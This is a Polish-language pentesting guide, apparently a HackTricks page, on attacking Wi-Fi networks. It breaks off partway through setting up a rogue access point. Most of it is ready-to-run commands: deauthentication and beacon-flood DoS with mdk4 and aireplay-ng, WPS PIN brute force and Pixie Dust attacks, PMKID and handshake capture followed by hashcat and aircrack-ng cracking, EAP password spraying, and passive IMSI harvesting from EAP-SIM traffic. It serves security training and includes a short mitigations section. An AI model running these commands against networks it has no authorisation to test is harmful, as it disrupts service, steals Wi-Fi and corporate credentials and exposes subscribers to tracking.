# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi podstawowe polecenia
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Narzędzia

### Hijacker & NexMon (wewnętrzne Wi‑Fi Androida)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Uruchom airgeddon za pomocą docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Źródło: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Może przeprowadzać ataki Evil Twin, KARMA i Known Beacons, a następnie użyć phishing template, aby zdobyć rzeczywiste hasło do sieci lub przechwycić dane uwierzytelniające do serwisów społecznościowych.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

To narzędzie automatyzuje ataki **WPS/WEP/WPA-PSK**. Automatycznie:

- Ustawi interfejs w tryb monitorowania
- Skanuje możliwe sieci — i pozwala wybrać cel(e)
- Jeśli WEP — uruchomi ataki WEP
- Jeśli WPA-PSK
- Jeśli WPS: Pixie dust attack oraz bruteforce attack (uwaga: bruteforce attack może potrwać długo). Zauważ, że nie próbuje null PIN ani PIN-ów z bazy/wygenrowanych.
- Próbuje przechwycić PMKID z AP w celu crackowania
- Próbuje zdezautoryzować klientów AP, aby przechwycić handshake
- Jeśli PMKID lub Handshake, próbuje przeprowadzić bruteforce używając top5000 passwords.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Rozłącza wszystkich (lub konkretny ESSID/Client)
- Random fake APs -- Ukrywa sieci, możliwe powodowanie awarii skanerów
- Overload AP -- Próbuje zabić AP (zwykle mało użyteczne)
- WIDS -- Manipulacja IDS
- TKIP, EAPOL -- Specyficzne ataki DoS wobec niektórych AP
- **Cracking**
- Crack **WEP** (kilka narzędzi i metod)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Przydatne do przechwytywania captive portal creds i/lub przeprowadzania ataków w LAN
- **WPA-PSK** Evil Twin -- Przydatne do ataków sieciowych jeśli znasz hasło
- **WPA-MGT** -- Przydatne do przechwytywania firmowych credentiali
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Przydatne do przechwytywania captive portal creds i/lub przeprowadzania ataków w LAN
- **+ WPA** -- Przydatne do przechwytywania WPA handshakes

## DOS

### Deauthentication Packets

**Description from** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, a prevalent method in Wi-Fi hacking, involve forging "management" frames to **forcefully disconnect devices from a network**. These unencrypted packets deceive clients into believing they are from the legitimate network, enabling attackers to collect WPA handshakes for cracking purposes or to persistently disrupt network connections. This tactic, alarming in its simplicity, is widely used and has significant implications for network security.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 oznacza deauthentication
- 1 to liczba deauths do wysłania (możesz wysłać więcej, jeśli chcesz); 0 oznacza wysyłać je ciągle
- -a 00:14:6C:7E:40:80 to adres MAC access pointa
- -c 00:0F:B5:34:30:30 to adres MAC klienta, który ma zostać deauthenticate; jeśli to zostanie pominięte, wysyłana jest broadcast deauthentication (nie zawsze działa)
- ath0 to nazwa interfejsu

### Disassociation Packets

**Disassociation packets**, podobnie jak deauthentication packets, są rodzajem ramki zarządzającej używanej w sieciach Wi‑Fi. Pakiety te służą do zerwania połączenia między urządzeniem (takim jak laptop lub smartfon) a access point (AP). Główna różnica między disassociation a deauthentication polega na scenariuszach użycia. Podczas gdy AP emituje **deauthentication packets, aby jednoznacznie usunąć rogue devices z sieci, disassociation packets są zwykle wysyłane, gdy AP jest wyłączany**, restartowany lub przenoszony, co wymaga rozłączenia wszystkich połączonych węzłów.

**Ten atak można wykonać za pomocą mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Więcej ataków DOS za pomocą mdk4**

**W** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Wysyła beacon frames, aby pokazać klientom fałszywe APs. To czasami może spowodować awarię skanerów sieciowych, a nawet sterowników!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Wysyłanie ramek uwierzytelniania do wszystkich dostępnych Access Points (APs) w zasięgu może przeciążyć te APs, zwłaszcza gdy zaangażowana jest duża liczba klientów. Ten intensywny ruch może prowadzić do niestabilności systemu, powodując zawieszanie się niektórych APs lub nawet ich reset.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) sprawdza, czy SSID jest poprawnie ujawniony i potwierdza zasięg AP. Ta technika, w połączeniu z **bruteforcing hidden SSIDs** z użyciem lub bez wordlist, pomaga w identyfikacji i uzyskaniu dostępu do ukrytych sieci.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Wysyłanie losowych lub duplikowanych pakietów do różnych kolejek QoS może wywołać Michael Countermeasures na **TKIP APs**, prowadząc do jednominutowego wyłączenia AP. Ta metoda jest skuteczną taktyką ataku **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Zalewanie AP za pomocą **EAPOL Start frames** tworzy **fałszywe sesje**, przeciążając AP i blokując prawdziwych klientów. Alternatywnie, wstrzyknięcie **fałszywych EAPOL Logoff messages** wymusza rozłączenie klientów — obie metody skutecznie zakłócają działanie sieci.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Ataki na sieci mesh IEEE 802.11s**

Różne ataki na zarządzanie łączami i trasowanie w sieciach mesh.

**ATTACK MODE w: Zamieszanie WIDS**

Krzyżowe łączenie klientów z wieloma węzłami WDS lub fałszywymi rogue APs może manipulować Intrusion Detection and Prevention Systems, powodując zamieszanie i potencjalne nadużycie systemu.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Packet Fuzzer oferuje różnorodne źródła pakietów oraz kompleksowy zestaw modyfikatorów do manipulacji pakietami.

### **Airggedon**

_**Airgeddon**_ oferuje większość ataków opisanych we wcześniejszych komentarzach:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) upraszcza proces podłączania urządzeń do routera, przyspieszając i ułatwiając konfigurację sieci szyfrowanych za pomocą **WPA** lub **WPA2** Personal. Nie ma zastosowania wobec łatwo łamanego **WEP**. WPS używa 8-cyfrowego PINu, weryfikowanego w dwóch częściach, co czyni go podatnym na ataki brute-force ze względu na ograniczoną liczbę kombinacji (około 11 000 możliwości).

### WPS Bruteforce

Istnieją 2 główne narzędzia do przeprowadzenia tego ataku: Reaver i Bully.

- **Reaver** został zaprojektowany jako solidne i praktyczne narzędzie do ataku na WPS i był testowany na szerokiej gamie access pointów oraz implementacji WPS.
- **Bully** jest **nową implementacją** ataku WPS brute-force, napisaną w C. Ma kilka zalet w porównaniu z oryginalnym kodem reaver: mniejsze zależności, lepsza wydajność pamięci i CPU, poprawne obchodzenie się z endianness oraz bardziej solidny zestaw opcji.

Atak wykorzystuje podatność **WPS PIN**, w szczególności ujawnienie pierwszych czterech cyfr oraz fakt, że ostatnia cyfra pełni rolę checksum, co ułatwia atak brute-force. Jednak mechanizmy obronne przed atakami brute-force, takie jak blokowanie **MAC addresses** agresywnych atakujących, wymuszają stosowanie **MAC address rotation**, aby kontynuować atak.

Po uzyskaniu **WPS PIN** za pomocą narzędzi takich jak Bully lub Reaver, atakujący może wyprowadzić **WPA/WPA2 PSK**, zapewniając trwały dostęp do sieci.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

To dopracowane podejście celuje w WPS PINs, wykorzystując znane luki:

1. **Pre-discovered PINs**: Wykorzystaj bazę danych znanych PINs powiązanych z konkretnymi producentami, którzy często stosują jednolite WPS PINs. Ta baza koreluje pierwsze trzy oktety adresów MAC z prawdopodobnymi PINs dla tych producentów.
2. **PIN Generation Algorithms**: Wykorzystaj algorytmy takie jak ComputePIN i EasyBox, które obliczają WPS PINs na podstawie adresu MAC APs. Algorytm Arcadyan dodatkowo wymaga device ID, dodając warstwę do procesu generowania PINs.

### WPS Pixie Dust attack

**Dominique Bongard** odkrył wadę w niektórych Access Points (APs) dotyczącą tworzenia tajnych kodów, znanych jako **nonces** (**E-S1** i **E-S2**). Jeśli te nonces można ustalić, złamanie WPS PIN APs staje się proste. AP ujawnia PIN w specjalnym kodzie (hash), aby udowodnić, że jest prawowity, a nie podrobiony (rogue) AP. Te nonces są w zasadzie "kluczami" do otwarcia "sejfu", który przechowuje WPS PIN. Więcej na ten temat można znaleźć [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Mówiąc prosto, problem polega na tym, że niektóre APs nie używały wystarczająco losowych kluczy do szyfrowania PIN-u podczas procesu łączenia. To sprawia, że PIN jest podatny na odgadnięcie z zewnątrz sieci (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Jeśli nie chcesz przełączać urządzenia w monitor mode, albo `reaver` i `bully` mają problemy, możesz wypróbować [OneShot-C](https://github.com/nikita-yfh/OneShot-C). To narzędzie potrafi przeprowadzić Pixie Dust attack bez konieczności przełączania w monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Niektóre słabo zaprojektowane systemy pozwalają nawet, by **Null PIN** (pusty lub nieistniejący PIN) przyznawał dostęp, co jest dość nietypowe. Narzędzie **Reaver** potrafi testować tę podatność, w przeciwieństwie do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Wszystkie proponowane ataki WPS można łatwo wykonać za pomocą _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 i 6 pozwalają wypróbować **własny PIN** (jeśli go masz)
- 7 i 8 wykonują **Pixie Dust attack**
- 13 pozwala przetestować **NULL PIN**
- 11 i 12 będą **zbierać PINy powiązane z wybranym AP z dostępnych baz danych** i **generować** możliwe **PINy** przy użyciu: ComputePIN, EasyBox i opcjonalnie Arcadyan (zalecane, czemu nie?)
- 9 i 10 przetestują **wszystkie możliwe PINy**

## **WEP**

Tak złamany i obecnie nieużywany. Wystarczy wiedzieć, że _**airgeddon**_ ma opcję WEP nazwaną "All-in-One" do atakowania tego typu ochrony. Więcej narzędzi oferuje podobne opcje.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

W 2018 roku, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) nową metodę ataku, unikalną, ponieważ wymaga tylko **jednego pakietu** i nie wymaga podłączenia żadnych klientów do docelowego AP — wystarczy interakcja między atakującym a AP.

Wiele nowoczesnych routerów dodaje **opcjonalne pole** do **pierwszej ramki EAPOL** podczas asocjacji, znane jako `Robust Security Network`. To zawiera `PMKID`.

Jak wyjaśnia oryginalny post, **PMKID** jest tworzony przy użyciu znanych danych:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Biorąc pod uwagę, że "PMK Name" jest stałe, znamy BSSID AP i stacji, a `PMK` jest identyczny z tym z full 4-way handshake, **hashcat** może wykorzystać te informacje do złamania PSK i odzyskania passphrase!

Aby **zebrać** te informacje i **bruteforce** lokalnie hasło, możesz wykonać:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs captured** zostaną wyświetlone w **console** i również **saved** wewnątrz \_ **/tmp/attack.pcap**\_\
Teraz przekonwertuj capture do formatu **hashcat/john** i crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Zauważ, że format poprawnego hash zawiera **4 części**, np.: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Jeśli Twój **tylko** zawiera **3 części**, to jest **nieprawidłowy** (przechwycenie PMKID nie było prawidłowe).

Zauważ, że `hcxdumptool` **również przechwytuje handshakes** (coś takiego pojawi się: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Możesz **przekształcić** **handshakes** do formatu **hashcat**/**john** używając `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Handshake capture

Atak na **WPA/WPA2** sieci można przeprowadzić poprzez przechwycenie **handshake** i próbę **crack** hasła **offline**. Proces ten polega na monitorowaniu komunikacji konkretnej sieci i **BSSID** na określonym **channel**. Oto uproszczony przewodnik:

1. Zidentyfikuj **BSSID**, **channel** oraz **connected client** docelowej sieci.
2. Użyj `airodump-ng` do monitorowania ruchu sieciowego na wskazanym **channel** i **BSSID**, mając nadzieję na przechwycenie **handshake**. Polecenie będzie wyglądać tak:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Aby zwiększyć szansę na przechwycenie handshake, chwilowo rozłącz clienta z network, aby wymusić re-authentication. Można to zrobić za pomocą polecenia `aireplay-ng`, które wysyła deauthentication packets do clienta:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Zauważ, że ponieważ client został deauthenticated, może próbować połączyć się z innym AP lub, w innych przypadkach, z inną siecią._

Gdy w `airodump-ng` pojawią się informacje o handshake, oznacza to, że handshake został przechwycony i możesz przestać nasłuchiwać:

![](<../../images/image (172) (1).png>)

Po przechwyceniu handshake możesz go **crack** za pomocą `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Sprawdź, czy w pliku jest handshake

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Jeśli to narzędzie znajdzie niekompletny handshake dla ESSID przed ukończonym, nie wykryje prawidłowego._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

W **środowiskach enterprise WiFi natkniesz się na różne metody uwierzytelniania**, każda z nich zapewnia inne poziomy bezpieczeństwa i funkcje zarządzania. Gdy używasz narzędzi takich jak `airodump-ng` do analizowania ruchu sieciowego, możesz zauważyć identyfikatory tych typów uwierzytelniania. Do powszechnie stosowanych metod należą:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Ta metoda obsługuje hardware tokens i hasła jednorazowe w ramach EAP-PEAP. W przeciwieństwie do MSCHAPv2 nie używa peer challenge i wysyła hasła w postaci plaintext do access pointa, co stwarza ryzyko downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Polega na wysłaniu skrótu MD5 hasła od klienta. Jest to **niezalecane** ze względu na podatność na dictionary attacks, brak uwierzytelnienia serwera oraz niemożność wygenerowania sesyjnych, specyficznych dla sesji WEP keys.
3. **EAP-TLS (Transport Layer Security)**:
- Wykorzystuje certyfikaty po stronie klienta i serwera do uwierzytelniania oraz może dynamicznie generować user-based i session-based WEP keys dla zabezpieczenia komunikacji.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Zapewnia mutual authentication przez szyfrowany tunel oraz metodę wyprowadzania dynamicznych, per-user, per-session WEP keys. Wymaga tylko certyfikatów po stronie serwera; klienci używają poświadczeń.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Działa podobnie do EAP, tworząc TLS tunnel dla chronionej komunikacji. Pozwala to na użycie słabszych protokołów uwierzytelniania nad EAP dzięki ochronie zapewnianej przez tunel.
- **PEAP-MSCHAPv2**: Często nazywany po prostu PEAP, łączy podatny mechanizm challenge/response MSCHAPv2 z ochronnym TLS tunnel.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Podobny do EAP-TLS, ale inicjuje TLS tunnel przed wymianą certyfikatów, oferując dodatkową warstwę bezpieczeństwa.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Przechwytywanie nazwy użytkownika

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) wygląda na to, że jeśli używasz **EAP** to **"Identity"** **messages** muszą być **supported**, a **username** zostanie wysłany w **clear** w **"Response Identity"** messages.

Nawet używając jednej z najbardziej bezpiecznych metod uwierzytelniania: **PEAP-EAP-TLS**, możliwe jest **capture the username sent in the EAP protocol**. Aby to zrobić, **capture a authentication communication** (uruchom `airodump-ng` na kanale i `wireshark` na tym samym interfejsie) i przefiltruj pakiety po `eapol`.\
Wewnątrz pakietu "**Response, Identity**" pojawi się **username** klienta.

![](<../../images/image (850).png>)

### Tożsamości anonimowe

Identity hiding jest obsługiwane zarówno przez EAP-PEAP jak i EAP-TTLS. W kontekście sieci WiFi, EAP-Identity request jest zwykle inicjowany przez access point (AP) podczas procesu association. Aby zapewnić ochronę anonimowości użytkownika, odpowiedź od EAP clienta na urządzeniu użytkownika zawiera tylko niezbędne informacje wymagane, aby początkowy RADIUS server mógł przetworzyć żądanie. Koncepcja ta jest zilustrowana przez następujące scenariusze:

- EAP-Identity = anonymous
- W tym scenariuszu wszyscy użytkownicy używają pseudonimu "anonymous" jako identyfikatora użytkownika. Początkowy RADIUS server działa jako EAP-PEAP lub EAP-TTLS server, odpowiedzialny za zarządzanie po stronie serwera protokołu PEAP lub TTLS. Wewnętrzna (chroniona) metoda uwierzytelniania jest następnie obsługiwana lokalnie lub delegowana do zdalnego (home) RADIUS server.
- EAP-Identity = anonymous@realm_x
- W tej sytuacji użytkownicy z różnych realmów ukrywają swoje tożsamości, jednocześnie wskazując swoje realm. Pozwala to początkowemu RADIUS server proxyfikować EAP-PEAP lub EAP-TTLS requests do RADIUS servers w ich home realmach, które działają jako PEAP lub TTLS server. Początkowy RADIUS server działa wyłącznie jako węzeł relay RADIUS.
- Alternatywnie, początkowy RADIUS server może funkcjonować jako EAP-PEAP lub EAP-TTLS server i albo obsługiwać chronioną metodę uwierzytelniania, albo przekazać ją do innego serwera. Ta opcja umożliwia skonfigurowanie odmiennych polityk dla różnych realmów.

W EAP-PEAP, gdy TLS tunnel zostanie ustanowiony pomiędzy PEAP server a PEAP client, PEAP server inicjuje EAP-Identity request i przesyła go przez TLS tunnel. Klient odpowiada na ten drugi EAP-Identity request wysyłając EAP-Identity response zawierający prawdziwą tożsamość użytkownika przez zaszyfrowany tunel. Podejście to skutecznie zapobiega ujawnieniu prawdziwej tożsamości użytkownika komukolwiek podsłuchującemu ruch 802.11.

EAP-TTLS postępuje nieco inaczej. W przypadku EAP-TTLS klient typowo uwierzytelnia się używając PAP lub CHAP, zabezpieczonych przez TLS tunnel. W tym przypadku klient dołącza atrybut User-Name oraz albo Password albo CHAP-Password w początkowej wiadomości TLS wysłanej po ustanowieniu tunelu.

Niezależnie od wybranego protokołu, PEAP/TTLS server uzyskuje wiedzę o prawdziwej tożsamości użytkownika po ustanowieniu TLS tunnel. Prawdziwa tożsamość może być reprezentowana jako user@realm lub po prostu user. Jeśli PEAP/TTLS server jest również odpowiedzialny za uwierzytelnienie użytkownika, teraz posiada tożsamość użytkownika i kontynuuje metodę uwierzytelniania chronioną przez TLS tunnel. Alternatywnie, PEAP/TTLS server może przekazać nowe RADIUS request do home RADIUS server użytkownika. To nowe RADIUS request pomija warstwę PEAP lub TTLS. W przypadkach, gdy chroniona metoda uwierzytelniania to EAP, wewnętrzne EAP messages są transmitowane do home RADIUS server bez wrappera EAP-PEAP lub EAP-TTLS. Atrybut User-Name wychodzącej wiadomości RADIUS zawiera prawdziwą tożsamość użytkownika, zastępując anonymous User-Name z przychodzącego RADIUS request. Gdy chronioną metodą jest PAP lub CHAP (obsługiwane tylko przez TTLS), User-Name i inne atrybuty uwierzytelniające wydobyte z TLS payload są podstawiane w wychodzącym RADIUS request, zastępując anonymous User-Name oraz TTLS EAP-Message attributes znajdujące się w przychodzącym RADIUS request.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notatki:
- Działa przed jakimkolwiek tunelem TLS, jeśli wdrożenie używa gołego EAP‑SIM/AKA bez chronionej tożsamości/pseudonimów.
- Ujawniona wartość to stały identyfikator powiązany z SIM subskrybenta; zebranie go umożliwia długoterminowe śledzenie i późniejsze nadużycia telekomunikacyjne.

Impact
- Privacy: persistent user/device tracking from passive Wi‑Fi captures in public places.
- Telecom abuse bootstrap: with the IMSI, an attacker with SS7/Diameter access can query location or attempt call/SMS interception and MFA theft.

Mitigacje / na co zwrócić uwagę
- Zweryfikuj, czy klienci używają anonymous outer identities (pseudonyms) dla EAP‑SIM/AKA zgodnie z wytycznymi 3GPP (np. 3GPP TS 33.402).
- Prefer tunneling the identity phase (e.g., EAP‑TTLS/PEAP carrying inner EAP‑SIM/AKA) so the IMSI is never sent in clear.
- Packet captures of association/auth should never reveal a raw IMSI in EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (zauważ, że **EAP-TLS won't be valid** w tym przypadku), to możesz spróbować zdobyć **list** a **usernames** (see next part) i **passwords** oraz spróbować **bruteforce** dostępu używając [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Możesz także wykonać ten atak przy użyciu `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria ataków na klienta

### Wybór sieci i roaming

- Protokół 802.11 definiuje, jak stacja dołącza do Extended Service Set (ESS), ale nie określa kryteriów wyboru ESS ani access pointa (AP) w jego obrębie.
- Stacje mogą przemieszczać się między APs współdzielącymi ten sam ESSID, utrzymując łączność w obrębie budynku lub obszaru.
- Protokół wymaga uwierzytelnienia stacji do ESS, ale nie nakłada obowiązku uwierzytelnienia AP wobec stacji.

### Listy preferowanych sieci (PNLs)

- Stacje przechowują ESSID każdej sieci bezprzewodowej, z którą się łączą, w swojej Preferred Network List (PNL), wraz z ustawieniami specyficznymi dla danej sieci.
- PNL jest używana do automatycznego łączenia z znanymi sieciami, poprawiając doświadczenie użytkownika poprzez uproszczenie procesu połączenia.

### Skanowanie pasywne

- APs okresowo nadają beacon frames, ogłaszając swoją obecność i możliwości, w tym ESSID APa, chyba że nadawanie ESSID jest wyłączone.
- Podczas skanowania pasywnego stacje nasłuchują beacon frames. Jeśli ESSID w beaconie pasuje do wpisu w PNL stacji, stacja może automatycznie połączyć się z tym AP.
- Znajomość PNL urządzenia umożliwia potencjalne wykorzystanie poprzez podszycie się pod ESSID znanej sieci, wprowadzając urządzenie w błąd i skłaniając je do połączenia z rogue AP.

### Aktywne sondowanie

- Aktywne sondowanie polega na tym, że stacje wysyłają probe requests, aby wykryć pobliskie APs i ich cechy.
- Directed probe requests celują w konkretny ESSID, pomagając wykryć, czy dana sieć jest w zasięgu, nawet jeśli jest ukryta.
- Broadcast probe requests mają pole SSID ustawione na null i są wysyłane do wszystkich pobliskich APs, pozwalając stacji sprawdzić, czy istnieje któraś preferowana sieć, bez ujawniania zawartości PNL.

## Prosty AP z przekierowaniem do Internetu

Zanim wyjaśnimy, jak wykonać bardziej złożone ataki, zostanie wyjaśnione **jak** po prostu **utworzyć** **AP** i **przekierować** jego **ruch** na interfejs podłączony **do** **Internetu**.

Używając `ifconfig -a` sprawdź, czy interfejs wlan, na którym chcesz utworzyć AP, oraz interfejs podłączony do Internetu są dostępne.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Utwórz plik konfiguracyjny `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Następnie **ustaw IPs** i **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Następnie **uruchom** dnsmasq:
